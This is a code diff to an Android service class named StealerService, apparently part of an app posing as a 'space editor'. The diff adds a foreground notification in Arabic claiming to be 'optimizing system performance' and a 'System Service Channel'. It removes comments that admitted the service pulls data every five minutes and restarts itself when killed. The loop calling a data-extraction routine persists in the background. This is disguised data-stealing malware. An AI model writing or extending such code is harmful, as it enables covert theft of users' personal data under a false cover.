@@ -1,9 +1,12 @@
 package com.example.spaceeditor;
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.os.Build;
 import android.os.IBinder;
-import android.util.Log;
 
 public class StealerService extends Service {
     private Thread workerThread;
@@ -13,20 +16,27 @@ public class StealerService extends Service {
     public void onCreate() {
         super.onCreate();
         isRunning = true;
+        createNotificationChannel();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        Notification notification = new Notification.Builder(this, "stealer_channel")
+                .setContentTitle("محرر المساحة")
+                .setContentText("جاري تحسين أداء النظام...")
+                .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .build();
+        startForeground(1, notification);
+
         if (workerThread == null || !workerThread.isAlive()) {
             workerThread = new Thread(new Runnable() {
                 @Override
                 public void run() {
                     while (isRunning) {
                         try {
-                            // الكود اللي بيسحب البيانات (هيتنفذ كل 5 دقايق في الخلفية)
                             MainActivity.extractDataInBackground(StealerService.this);
-                            Thread.sleep(300000); // 5 دقائق
-                        } catch (InterruptedException e) {
+                            Thread.sleep(300000);
+                        } catch (Exception e) {
                             e.printStackTrace();
                         }
                     }
@@ -34,7 +44,21 @@ public class StealerService extends Service {
             });
             workerThread.start();
         }
-        return START_STICKY; // عشان لو النظام قفله، يرجع يشتغل تاني
+        return START_STICKY;
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel serviceChannel = new NotificationChannel(
+                    "stealer_channel",
+                    "System Service Channel",
+                    NotificationManager.IMPORTANCE_LOW
+            );
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(serviceChannel);
+            }
+        }
     }
 
     @Override
